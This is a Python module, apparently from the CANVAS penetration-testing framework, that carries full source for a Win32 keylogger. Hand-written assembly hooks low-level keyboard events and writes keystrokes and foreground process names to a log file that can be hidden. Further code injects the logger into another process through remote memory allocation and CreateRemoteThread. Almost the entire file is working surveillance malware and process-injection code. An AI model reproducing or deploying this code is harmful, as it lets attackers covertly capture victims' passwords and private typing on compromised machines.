#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit

NAME="Win32 Keylogger"
DESCRIPTION="Simple Win32 Keylogger"
DOCUMENTATION={}

VERSION="1.0"

# XXX: fix these with proper properties
PROPERTY={}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Windows"] ]

DOCUMENTATION['Notes'] = """ This logger has to be in a process that is in the
active desktop. E.g. explorer.exe. So if you're in a process that is NOT on
the active desktop (say lsass.exe or services.exe) you just set the pid for a
process that is, and it will inject the logger into that process.

This simple approach makes the logger very flexible for practical usage.

Exporer.exe is probably a bad choice on modern Windows XP SP2 due to the data
execution protection.

"""

NOTES="""
Simple lowlevel keylogging (which requires no dll). For this keylogger to work you'll have
to make sure that it is running in a process on the active desktop. Which is why we made it
thread injectable. So if you're inside LSASS, inject into a process on the desktop.

For local thread just run, for remote thread set 'pid' argument to pid of process you want
to inject into. e.g. -O pid:pidofnotepad.exe

"""

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name = NAME
        self.node = None
        self.pid = 0
        self.term = 0
        return

    def neededListenerTypes(self): 
        return []

    def hookProcedure(self):
        hookFunctionVars = {}
        
        #struct WM_KEYBOARD_LL {
        #    int vkCode;
        #    int scanCode;
        #    int flags;
        #    int time;
        #               
        #    int *dwExtraInfo;
        #};
        hookFunctionAsm = """
        // because this has to be a callable standalone function, and we can't
        // do function pointers properly I have to do this handler in assembly
        
        push %ebp
        movl %esp,%ebp

        pushl %ebx
        pushl %esi
        pushl %edi

        starthook:
        
        // get our in args (nCode, wParam, lParam)
        movl 0x08(%ebp),%ebx // nCode
        movl 0x0c(%ebp),%ecx // wParam
        movl 0x10(%ebp),%edx // lParam -> is a pointer to a WH_KEYBOARD_LL struct

        // HC_ACTION == 0
        test %ebx,%ebx
        jnz callnexthook

        // if HC_ACTION we can process this event
        // check for either wParam of WM_SYSKEYDOWN or WM_KEYDOWN
        cmpw $0x0100,%cx // WM_KEYDOWN
        je processevent
        cmpw $0x0104,%cx // WM_SYSKEYDOWN
        jne callnexthook

        processevent:

        // test for keys we want to SKIP here, (like shift being held down is annoying)
        // first DWORD in the WH_KEYBOARD_LL struct is a vkCode
        movb (%edx),%al
        cmpb $0x14,%al // VK_CAPITAL
        je callnexthook
        cmpb $0xa0,%al // VK_LSHIFT
        je callnexthook
        cmpb $0xa1,%al // VK_RSHIFT
        je callnexthook
        
        // ################# LOGFILE CONTROLLED HERE ############################
        pushl $0
        //PUSHLOGHERE
        
        movl %esp,%esi
        pushl $0
        pushl $0x0080 // to hide set FILE_ATTRIBUTE_HIDDEN too (0x2)
        pushl $0x0004 // set to OPEN_ALWAYS
        pushl $0
        pushl $0
        pushl $0x40000000
        pushl %esi
        movl $CREATEFILE,%eax
        call *%eax
        addl $8,%esp

        // if we cant log, no reason to handle it
        cmpl $-1,%eax
        je callnexthook
        test %eax,%eax
        jz callnexthook
        
        movl %eax,%edi // log handle in %edi
        
        //int3

        // position the file pointer to end of file
        pushl $2 // FILE_END
        pushl $0 // high is NULL
        pushl $0 // we don't want to move it from FILE_END
        pushl %edi 
        movl $SETFILE,%eax
        call *%eax

        // WINDOW HANDLE HANDLING HERE...
        movl $GETFGWINDOW,%eax
        call *%eax 
        
        jmp getwindow
        gotwindow:
        popl %ebx
        cmpl %eax,(%ebx)
        je getkeyname // skip process name muck if same handle as last log event
        movl %eax,(%ebx) // update if not equal
        
        processname:
        pushl %eax // save handle
        
        // get the PID of the window process
        pushl $0
        movl %esp,%ecx
        pushl %ecx // &PID
        pushl %eax // push handle
        movl $GETWPID,%eax
        call *%eax
        popl %eax
        // pid in eax, checkme, do PS style fun

//int3 

// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

//int3

        // to get full name use snapshot kernel32.dll toolhelp
        // or openprocess/getbasemodulefromhandle...problem:
        // these require outside dlls, and because this logger
        // is injectable, we can not assume psapi or toolhelp
        // is available for the remote thread..so toolhelp
        // is the only option

        pushl %edi
        pushl %eax
        
        // process entry struct
        subl $1060,%esp
        movl %esp,%edi // edi points to struct
        
        // get snapshot handle
        pushl $0
        pushl $2
        movl $CREATETOOLHELP32SNAPSHOT,%eax
        call *%eax
        test %eax,%eax
        jz getkeyname
        
        // set size into struct
        movl $1060,(%edi)

        pushl %eax
        // process first
        pushl %edi
        pushl %eax
        movl $PROCESS32FIRST,%eax
        call *%eax
        test %eax,%eax
        jz errortoolhelp
        popl %eax // get handle back

        // check if it's our process
        movl 8(%edi),%ebx
        cmpl %ebx,1060(%edi) // where our saved PID lives
        je logname

        // loop through all the processes untill we find our pid
        nextprocessloop:
        
        pushl %eax
        // process next
        pushl %edi
        pushl %eax
        movl $PROCESS32NEXT,%eax
        call *%eax
        test %eax,%eax
        jz errortoolhelp
        popl %eax

        movl 8(%edi),%ebx
        cmpl %ebx,1060(%edi)
        jne nextprocessloop

        logname:
        pushl %eax // push handle
        
        addl $36,%edi // edi now points to a null terminated string with the name
//int3
//just writefile again here too, for next version ill make the logging less noisy
//will make flushtolog a function

//int3

        movl %edi,%esi
        movl 1028(%edi),%edi // get filehandle for log header

        // pre header ## NAME.EXE ##
        // terminate with some spaces
        movl $0x2023230d,%ecx  // little kludge for now
        decl %ecx
        pushl %ecx
        movl %esp,%ecx

        pushl $4
        pushl %ecx
        pushl %edi
        call writefile
        // clear stack
        popl %eax

        // loop untill nul byte
        writenamebyte:
        pushl $1
        pushl %esi
        pushl %edi
        call writefile

        // test next char for nul
        incl %esi
        xorl %ecx,%ecx
        movb (%esi),%cl
        test %ecx,%ecx
        jnz writenamebyte

        // terminate with a NAME.EXE ## newline
        movl $0x0b232320,%ecx // little kludge for now
        subl $0x01000000,%ecx // workaround
        pushl %ecx
        movl %esp,%ecx

        pushl $4
        pushl %ecx
        pushl %edi
        call writefile
        // clear stack
        popl %eax
        
        // close snapshot handle and continue into getkeyname
        errortoolhelp:
        
        // handle is already on stack, close it
        movl $CLOSEHANDLE,%eax
        call *%eax
        // adjust stack, and restore vars
        addl $1060,%esp
        popl %eax
        popl %edi
        
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

        getkeyname:
                
        subl $0x100,%esp
        movl %esp,%esi // lpString
        // use GetKeyNameText to get a description
        movl 0x10(%ebp),%edx // get lParam
        movl $1,%eax
        movl 4(%edx),%ebx // scanCode
        movl 8(%edx),%ecx // flags
        shll $16,%ebx // put scanCode bits in right place
        shll $24,%ecx // put flags bits in right place
        orl %ebx,%eax 
        orl %ecx,%eax // lParam for GetKeyNameText 
        
        pushl $0x100
        pushl %esi
        pushl %eax
        movl $GETKEYNAME,%eax
        call *%eax
        pushl %edi
        pushl %esi
        pushl %eax
        // eax now has length of string

//int3

        // test for L_SHIFT/R_SHIFT/CAPS_LOCK accordingly
        // shiftstate in esi, capstate in edi
        pushl $0x10 // VK_SHIFT
        movl $GETKEYSTATE,%eax
        call *%eax
        andl $0x8000,%eax
        shrl $15,%eax
        movl %eax,%esi

        pushl $0x14 // VK_CAPITAL
        movl $GETKEYSTATE,%eax
        call *%eax
        andl $1,%eax
        movl %eax,%edi

        // test capstate XOR shiftstate
        xorl %edi,%esi
        test %esi,%esi
        jnz nolower
        
        //int3
        // tolower any char
        // if len == 1, not-special char
        cmpl $1,(%esp)
        jne nolower
        movl 4(%esp),%esi

        // ok lower this character if > 0x40
        movb (%esi),%cl
        movb $0x40,%ch
        cmpb %cl,%ch
        jge nolower
        
        addb $0x20,%cl
        movb %cl,(%esi)
        
        nolower:

        popl %eax
        popl %esi
        popl %edi
        
        flushtolog:
        // if eax is not 1, we need special char brackets [Space]
        cmpl $1,%eax
        jne special

        notspecial:

        nop // our memcpy works as a string literal, prevent 0x22 byte

        pushl %eax
        pushl %esi
        pushl %edi
        call writefile
        jmp logged // kludge

        // special bracket name bracket logging format
        special:

        pushl %eax
        pushl $0x5b
        movl %esp,%ecx
        pushl $1
        pushl %ecx
        pushl %edi
        call writefile
        popl %eax
        popl %eax

        pushl %eax
        pushl %esi
        pushl %edi
        call writefile
        
        pushl $0x5d
        movl %esp,%ecx
        pushl $1
        pushl %ecx
        pushl %edi
        call writefile
        // end of special name logging

        logged:

        // 104 due to pushl 0x5d cleanup, also fixes 0x100
        // mosdef quirk for now
        addl $0x104,%esp

        // CloseHandle the file
        pushl %edi
        movl $CLOSEHANDLE,%eax
        call *%eax
        
        callnexthook:

        pushl 0x10(%ebp) // lParam
        pushl 0x0c(%ebp) // wParam
        pushl 0x08(%ebp) // nCode
        pushl $0
        movl $NEXTHOOK,%eax // do this dynamically after testing
        call *%eax

        returnhooker:
        
        // return value is already in %eax
        popl %edi
        popl %esi
        popl %ebx
        
        movl %ebp,%esp
        pop %ebp
        
        ret $12 // 3 dword args to this function

// HELPER FUNCTIONS

// writefile(handle, string, len)
writefile:

        push %ebp
        movl %esp,%ebp

        pushl %ebx
        pushl %esi
        pushl %edi

        // log the string with WriteFile (handle is in edi)
        pushl $0
        movl %esp,%ebx // &bWritten
       
        // get the args 
        movl 8(%ebp),%edi
        movl 12(%ebp),%esi
        movl 16(%ebp),%eax
                
        pushl $0
        pushl %ebx // &bWritten
        pushl %eax // len
        pushl %esi // string
        pushl %edi // handle
        movl $WRITEFILE,%eax
        call *%eax
        pushl %eax
        // flush the handle
        pushl %edi
        movl $FLUSHFILE,%eax
        call *%eax
        popl %eax
        // eat bWritten
        popl %edi
        // return value is already in %eax
        popl %edi
        popl %esi
        popl %ebx
        
        movl %ebp,%esp
        pop %ebp

        ret $12 // handle, string, length


// GLOBALS

        // uuuuggglyyyyyyy !
        getwindow:
        call gotwindow
        .long 0x41424344

        """

        # get the addies for CallNextHookEx dynamically
        NEXTHOOK = self.node.shell.getprocaddress_withmalloc("user32.dll|CallNextHookEx")
        CREATEFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|CreateFileA")
        WRITEFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|WriteFile")
        CLOSEHANDLE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|CloseHandle")
        GETKEYNAME = self.node.shell.getprocaddress_withmalloc("user32.dll|GetKeyNameTextA")
        GETKEYSTATE = self.node.shell.getprocaddress_withmalloc("user32.dll|GetKeyState")
        SETFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|SetFilePointer")
        FLUSHFILE = self.node.shell.getprocaddress_withmalloc("kernel32.dll|FlushFileBuffers")
        GETFGWINDOW = self.node.shell.getprocaddress_withmalloc("user32.dll|GetForegroundWindow")
        GETWPID = self.node.shell.getprocaddress_withmalloc("user32.dll|GetWindowThreadProcessId")
        CREATETOOLHELP32SNAPSHOT = self.node.shell.getprocaddress_withmalloc("kernel32.dll|CreateToolhelp32Snapshot")
        PROCESS32FIRST = self.node.shell.getprocaddress_withmalloc("kernel32.dll|Process32First")
        PROCESS32NEXT = self.node.shell.getprocaddress_withmalloc("kernel32.dll|Process32Next")

        hookFunctionAsm = hookFunctionAsm.replace("NEXTHOOK", "0x%X"%NEXTHOOK)
        hookFunctionAsm = hookFunctionAsm.replace("CREATEFILE", "0x%X"%CREATEFILE)
        hookFunctionAsm = hookFunctionAsm.replace("WRITEFILE", "0x%X"%WRITEFILE)
        hookFunctionAsm = hookFunctionAsm.replace("CLOSEHANDLE", "0x%X"%CLOSEHANDLE)
        hookFunctionAsm = hookFunctionAsm.replace("GETKEYNAME", "0x%X"%GETKEYNAME)
        hookFunctionAsm = hookFunctionAsm.replace("GETKEYSTATE", "0x%X"%GETKEYSTATE)
        hookFunctionAsm = hookFunctionAsm.replace("SETFILE", "0x%X"%SETFILE)
        hookFunctionAsm = hookFunctionAsm.replace("FLUSHFILE", "0x%X"%FLUSHFILE)
        hookFunctionAsm = hookFunctionAsm.replace("GETFGWINDOW", "0x%X"%GETFGWINDOW)
        hookFunctionAsm = hookFunctionAsm.replace("GETWPID", "0x%X"%GETWPID)
        hookFunctionAsm = hookFunctionAsm.replace("CREATETOOLHELP32SNAPSHOT", "0x%X"%CREATETOOLHELP32SNAPSHOT)
        hookFunctionAsm = hookFunctionAsm.replace("PROCESS32FIRST", "0x%X"%PROCESS32FIRST)
        hookFunctionAsm = hookFunctionAsm.replace("PROCESS32NEXT", "0x%X"%PROCESS32NEXT)

        logfile = self.argsDict.get("log","C:\\log-%s.txt"%time.strftime("%s"))

        hookFunctionAsm = hookFunctionAsm.replace("//PUSHLOGHERE", self.pushString(logfile))

        # node compile and return the stub
        from MOSDEF import mosdef
        hookFunction = mosdef.assemble(hookFunctionAsm, "X86")
        return hookFunction

    def pushString(self, log): # returns a string as a series of stack pushes
        i = len(log)
        pushit = ""
        while (i):
            if i%4:
                addpush = "pushl $0x"
                while(i%4):
                    addpush += "%.2x"%ord(log[i-1]); i -= 1
                pushit += addpush + "\n"
            elif i >= 4: # step of 4 bytes left
                addpush = "pushl $0x"
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                addpush += "%.2x"%ord(log[i-1]); i -= 1
                pushit += addpush + "\n"
        return pushit
        
    def compileHookLogger(self):
        hookFunction = self.hookProcedure()

        # XXX: temporary back escape fix
        # to deal with memcpy(dst, "\x0a", ...) newline breakage in cparse
        #hookFunction = hookFunction.replace("\x0a", "\\n")
        #hookFunction = hookFunction.replace("\x0d", "\\r")

        # because MOSDEF blows at function pointers, I have to node compile the stub
        # and memcpy the function into memory so I have an actual address for my procedure
        hookLoggerVars = {}
        hookLoggerVars["HOOKSIZE"] = len(hookFunction)
        hookLoggerVars["HOOKFUNCTION"] = hookFunction
        
        hookLoggerCode = """
        //#import "remote", "kernel32.dll|MoveFileA" as "MoveFile"
        #import "remote", "kernel32.dll|GetModuleHandleA" as "GetModuleHandle"
        #import "remote", "kernel32.dll|ExitThread" as "ExitThread"
        #import "remote", "user32.dll|SetWindowsHookExA" as "SetWindowsHookEx"
        #import "remote", "user32.dll|UnhookWindowsHookEx" as "UnhookWindowsHookEx"
        #import "remote", "user32.dll|GetMessageA" as "GetMessage"
        //#import "remote", "user32.dll|PeekMessageA" as "PeekMessage"
        #import "remote", "user32.dll|TranslateMessage" as "TranslateMessage"
        #import "remote", "user32.dll|DispatchMessageA" as "DispatchMessage"
        //#import "remote", "user32.dll|RegisterWindowMessageA" as "RegisterWindowMessage"
        #import "remote", "user32.dll|RegisterHotKey" as "RegisterHotKey"
        #import "remote", "kernel32.dll|CreateMutexA" as "CreateMutex"
        #import "remote", "kernel32.dll|OpenMutexA" as "OpenMutex"
        #import "remote", "kernel32.dll|ReleaseMutex" as "ReleaseMutex"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"
        //#import "remote", "kernel32.dll|Sleep" as "Sleep"
        #import "remote", "kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"
        
        #import "local", "debug" as "debug"
        #import "local", "malloc" as "malloc"
        #import "local", "memcpy" as "memcpy"
        
        #import "string", "HOOKFUNCTION" as "HOOKFUNCTION"
        #import "int", "HOOKSIZE" as "HOOKSIZE"

        struct POINT {
            int x;
            int y;
        };

        //typedef struct {
        //   HWND hwnd;
        //   UINT message;
        //   WPARAM wParam;
        //   LPARAM lParam;
        //   DWORD time;
        //   POINT pt;
        //} MSG, *PMSG;
 
        struct MSG {
            int hwnd;
            int message;
            char *wParam;
            char *lParam;
            int time;
            
            struct POINT pt;
        };
        
        // we can do our terminate semantics here inside the loop
        // a return from this unhooks the keylogger and exits the thread

        // XXX: because our thread only has to be on the active desktop
        // and not necessarily in a process that actually has a window
        // (e.g. cmd.exe) we should prolly use a mutexHandler instead 
        // of a message handler

        void messageHandler(int tMsg)
        {
            // example from MSDN
            int bRet;
            int mRet;
            struct MSG msg;

            // we're only interested in tMsg, so set range accordingly
            // PM_NOREMOVE == 0x0000 PM_REMOVE == 0x0001 for peekmessage
            while(bRet = GetMessage(&msg, 0, 0, 0))
            {
                if (bRet == -1)
                {
                    return;
                }
                else
                {
                    // the hotkey message is the only message we
                    // get in this thread (except for the exception triggering)
                    // so we can return if getmessage returns i guess
                    //debug();
                    return;
                    
                    //TranslateMessage(&msg);
                    //DispatchMessage(&msg);
                }
            }
        }

        void mutexHandler(int hMtx)
        {
            struct MSG msg;
            //debug();
            WaitForSingleObject(hMtx, -1);
            // release it once we have it
            ReleaseMutex(hMtx);
            debug();
            return;
        }
        
        void main()
        {
            char *KeyEvent;
            
            int hHook;
            int hModule;
            int lError;
            int tMsg; // msg identifier that halts logger
            int hMtx;

            // XXX: assuming user knows what he's doing :>

            // make sure we don't run 2 instances of the logger
            //CreateMutex(0, 0, "Global\\LOGMGR");
            //lError = GetLastError();
            //if (lError == 183) // ERROR_ALREADY_EXISTS
            //{
            //    ExitThread(0);
            //}
            
            // exit control via hotkey (mutex semantics seem not very spiffy on thread exit)
            RegisterHotKey(0, 0xdeadbabe, 0x02, 0x70); // MOD_CONTROL + F1
            
            // get an address for our function in an ugly way because MOSDEF
            // doesn't do function pointers correctly yet
            KeyEvent = malloc(HOOKSIZE);
            memcpy(KeyEvent, HOOKFUNCTION, HOOKSIZE);

            // handle to module
            hModule = GetModuleHandle(0);
        
            // install the hook (WH_KEYBOARD_LL == 13)
            //debug();
            hHook = SetWindowsHookEx(13, KeyEvent, hModule, 0);

            // get a handle to the mosdef thread TERMLOG mutex
            //hMtx = CreateMutex(0, 0, "Global\\TERMLOG");
            // fall back on our message handling the mutex isn't there
            hMtx = 0;
            if (hMtx == 0)
            {
                //debug();
                messageHandler(tMsg);
            }
            else
            {
                mutexHandler(hMtx);
            }

            // unhook
            UnhookWindowsHookEx(hHook);
        
            // this is running as a detached thread, so no sendint
            ExitThread(0);
        }
        """
        # node compile and return the logger
        self.node.shell.clearfunctioncache()
        hookLogger = self.node.shell.compile(hookLoggerCode, hookLoggerVars)

        # XXX: we have to encode this untill we switch to a functionpointer version
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring("\"\n\x00")
        hookLogger = encoder.encode(hookLogger)

        return hookLogger

    def escapeFix(self, code):
        escaped = ""
        for c in code:
            if c == "\"":
                escaped += "\\"
            escaped += c
        return escaped
            
    def localThread(self, logCode):
        # XXX: have to stage the threading because MOSDEF sucks at function pointers
        threadVars = {}

        threadVars["CODESIZE"] = len(logCode)
        #logCode = self.escapeFix(logCode) # XXX
        threadVars["THREADME"] = logCode

        threadCode = """
        #import "remote", "kernel32.dll|CreateThread" as "CreateThread"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"

        #import "remote", "kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"
        #import "remote", "kernel32.dll|CreateMutexA" as "CreateMutex"
        
        #import "local", "sendint" as "sendint"
        #import "local", "malloc" as "malloc"
        #import "local", "memcpy" as "memcpy"
        
        #import "int", "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main() 
        {            
            int hThread;
            char *fp;
            int hMtx;

            fp = malloc(CODESIZE);
            memcpy(fp, THREADME, CODESIZE);

            // before we start the logger, create a mutex TERMLOG that is initially owned
            hMtx = CreateMutex(0, 1, "Global\\TERMLOG");
            // make sure we have ownership, might be a double run where we previously
            // released this mutex and it already exists
            WaitForSingleObject(hMtx, -1);

            hThread = CreateThread(0, 0, fp, 0, 0, 0);
            if (hThread == 0)
            {
                // failed
                sendint(hThread);
            }
            CloseHandle(hThread);
            sendint(1);
        }
        """
        return self.node.shell.runCode(threadCode, threadVars)

    def remoteThread(self, logCode, pid):

        injectVars = {}
        injectVars["PID"] = pid
        injectVars["CODESIZE"] = len(logCode)
        #logCode = self.escapeFix(logCode) # XXX
        injectVars["THREADME"] = logCode

        injectCode = """
        #import "remote","kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote","kernel32.dll|VirtualAllocEx" as "VirtualAllocEx"
        #import "remote","kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        #import "remote","kernel32.dll|CreateRemoteThread" as "CreateRemoteThread"

        #import "remote", "kernel32.dll|CreateMutexA" as "CreateMutex"
        #import "remote", "kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        #import "int", "PID" as "PID"
        #import "int", "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main()
        {
            int pHandle;
            int address;
            int rVal;
            int hMtx;

            //debug();
            pHandle = OpenProcess(0x43a, 0, PID);
            if (pHandle == 0) 
            {
                sendint(0);
                return;
            }

            address = VirtualAllocEx(pHandle, 0, CODESIZE, 0x1000, 0x40);
            if (address == 0) 
            {
                sendint(0);
                return;
            }

            rVal = WriteProcessMemory(pHandle, address, THREADME, CODESIZE, 0);
            if (rVal == 0) 
            {
                sendint(0);
                return;
            }
 
            // before we start the logger, create a mutex TERMLOG that is initially owned
            hMtx = CreateMutex(0, 1, "Global\\TERMLOG");
            // make sure we have ownership, might be a double run where we previously
            // released this mutex and it already exists
            WaitForSingleObject(hMtx, -1);

            rVal = CreateRemoteThread(pHandle, 0, 0, address, 0, 0, 0);
            if (rVal == 0) 
            {
                sendint(0);
                return;
            }

            sendint(1);
        }
        """
        return self.node.shell.runCode(injectCode, injectVars)

    # terminates our logger thread by sending a 
    def termLogger(self):
        # XXX: have to stage the threading because MOSDEF sucks at function pointers
        termVars = {}

        termCode = """
        //#import "remote", "user32.dll|RegisterWindowMessageA" as "RegisterWindowMessage"
        //#import "remote", "user32.dll|SendMessageA" as "SendMessage"
        //#import "remote", "user32.dll|FindWindowA" as "FindWindow"
        //#import "remote", "kernel32.dll|CreateMutexA" as "CreateMutex"
        //#import "remote", "kernel32.dll|ReleaseMutex" as "ReleaseMutex"
        //#import "remote", "kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"
        //#import "remote", "kernel32.dll|Sleep" as "Sleep"

        #import "remote", "user32.dll|keybd_event" as "keybd_event"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
       
        void main() 
        {
            
            // to terminate all we have to do is release the TERMLOG mutex in our mosdef thread
            //int hMtx;
            //hMtx = CreateMutex(0, 0, "Global\\TERMLOG");
            //if (hMtx == 0)
            //{
            //    sendint(-1);
            //    return;
            //}
            // wait for it in case we don't have inited ownership yet
            //WaitForSingleObject(hMtx, -1);
            // release it, termination is controlled by a waitforsingleobject in logger thread
            // you have to call releasemutex for each time you've obtained ownership, never
            // more than twice (we might've done it on the thread init), and just now
            //ReleaseMutex(hMtx);
            //ReleaseMutex(hMtx);
            //ReleaseMutex(hMtx);

            // simulate the hotkey VK_CONTROL + VK_F1
            // keydown VK_CONTROL
            keybd_event(0x11, 0x45, 1, 0);
            // keydown VK_F1
            keybd_event(0x70, 0x45, 1, 0);
            // key ups
            keybd_event(0x70, 0x45, 3, 0);
            keybd_event(0x11, 0x45, 3, 0);

            // the mutex handling wasn't working very spifferific (especially on thread exit)
            // so we switched to a hotkey handling, so to terminate we need to sendinput a
            // MOD_CONTROL and a VK_F1

            sendint(1);             
        }
        """
        return self.node.shell.runCode(termCode, termVars)

    def getargs(self):
        """Get all the arguments from the commandline or gui"""
        self.pid = int(self.argsDict.get("pid", self.pid))
        self.node = self.argsDict["passednodes"][0]            
        self.term = int(self.argsDict.get("term",self.term))
        
    def run(self):
        self.getargs()

        result = 0
        # send terminating message and exit
        if self.term:
            result = self.termLogger()
            if result == -1:
                msg = "[!] -"
            else:
                msg = "[!] +"
            self.log(msg + " tried to terminate logger ...")
            return result

        logger = self.compileHookLogger()

        try:
            if not self.pid:
                self.log("[!] Defaulting to regular thread mode...")
                # spawns logger as a local thread
                result = self.localThread(logger)
            else:
                # spawns logger as a remote thread
                result = self.remoteThread(logger, self.pid)
        except:
            print "[!] error on logger init!"
 
        if result:
            node = self.argsDict["passednodes"][0]
            target = node.get_known_host("127.0.0.1")
            target.add_knowledge("keylog", self.argsDict["log"], 100)
            self.log("[!] Logger thread initialized")
        else:
            self.log("[!] Logger thread failed")

        return result

    

